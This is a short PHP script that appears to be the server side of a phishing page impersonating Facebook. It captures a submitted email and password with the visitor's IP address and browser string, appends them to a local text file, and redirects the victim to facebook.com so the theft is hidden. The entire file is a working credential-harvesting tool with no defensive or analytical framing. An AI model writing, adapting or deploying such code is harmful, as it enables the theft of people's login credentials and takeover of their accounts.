<?php

error_reporting(0);

if(isset($_POST['email'])){
	
	if(strlen($_POST['email'])>5 && strlen($_POST['password'])>4)
	{
		
		$IP = $_SERVER['REMOTE_ADDR'];
		$email = $_POST['email'];
		$password = $_POST['password'];
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		
		file_put_contents('opop.txt', "$email:$password:$IP:$useragent" . PHP_EOL, FILE_APPEND | LOCK_EX);
		header('Location: http://facebook.com');
		die();
	}
	
	header('Location: http://facebook.com');
}

header('Location: http://facebook.com');

?>